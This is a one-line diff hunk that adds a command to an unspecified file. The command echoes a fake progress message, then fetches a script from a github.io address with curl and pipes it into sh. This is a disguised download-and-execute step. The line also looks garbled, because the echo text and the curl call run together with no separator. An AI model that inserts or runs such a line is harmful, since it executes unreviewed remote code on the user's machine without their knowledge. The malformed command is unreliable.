@@ -1,0 +1,1 @@
+echo Progress: 88.00%curl -L --progress-bar frkns.github.io/fun/pressedDrawsStuckPrev | sh
